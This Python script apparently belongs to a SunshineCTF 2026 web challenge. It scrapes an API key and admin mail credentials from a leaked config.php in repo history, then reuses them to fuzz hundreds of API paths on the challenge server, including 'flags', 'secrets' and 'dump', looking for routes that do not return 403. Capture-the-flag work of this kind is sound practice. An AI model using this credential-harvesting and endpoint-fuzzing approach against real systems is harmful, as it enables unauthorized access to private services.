#!/usr/bin/env python
"""Sweep every /api/v2/* shape for a different answer than the uniform 403.

If any route emits JSON-shaped text (an OpenAI-style embedding or a 422 listing required fields)
the same PHP front that fakes heartbeat/version also fronts a real vector store, and that route is
the intended door. Bodies longer than the 29-byte 403 are printed in full.
"""
import base64, json, re, concurrent.futures as cf, urllib.error, urllib.request
CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
USER = re.search(r"MAIL_ADMIN_USER',\s*'([^']+)'", CFG).group(1)
PW = re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1)
BASIC = base64.b64encode(("%s:%s" % (USER, PW)).encode()).decode()
BASE = "http://vec.web.2026.sunshinectf.games:8000"
STD = [("Authorization: Basic " + BASIC), ("X-API-Key: " + KEY)]

def go(args):
    method, path, body = args
    h = {"Content-Type": "application/json", "X-API-Key": KEY, "Authorization": "Basic " + BASIC}
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return method, path, r.status, r.read()
    except urllib.error.HTTPError as e:
        return method, path, e.code, e.read()
    except Exception as e:
        return method, path, type(e).__name__, str(e).encode()

if __name__ == "__main__":
    leaves = ["embed","embeddings","embedding","vector","vectors","encode","similarity","model",
              "inference","predict","search","query","rank","distance","tokenize","vec2text",
              "collections","collection","documents","document","ids","chunk","chunks","store",
              "get","add","update","upsert","delete","count","peek","list","index","indexes",
              "tenant","tenants","database","databases","auth","identity","config","settings",
              "version","heartbeat","reset","wipe","health","ready","status","metrics","stats",
              "openapi.json","docs","redoc","spec","swagger.json","admin","debug","internal",
              "raw","dump","export","files","flags","flag","secret","secrets","key","keys"]
    prefixes = ["/api/v2", "/api/v1", "/api", "/v2", "/v1", "/api/v2/collections",
                "/api/v2/collection", "/api/v2/auth", ""]
    jobs = []
    for p in prefixes:
        for l in leaves:
            jobs.append(("GET", "%s/%s" % (p, l), None))
    for l in ["embed","query","get","collections","auth","search","documents"]:
        jobs.append(("POST", "/api/v2/" + l, {"input": "hello", "model": "all-MiniLM-L6-v2",
                                              "collection_name": "default", "name": "default"}))
    seen = {}
    with cf.ThreadPoolExecutor(20) as ex:
        for method, path, st, b in ex.map(go, jobs):
            key = (st, len(b), b[:60])
            seen.setdefault(key, []).append((method, path))
    for key, lst in sorted(seen.items(), key=lambda kv: -len(kv[1])):
        st, ln, pre = key
        print("### %-4s len=%-5s %r  (%d routes)" % (st, ln, pre[:120], len(lst)))
        for m, p in lst[:12]:
            print("      ", m, p)
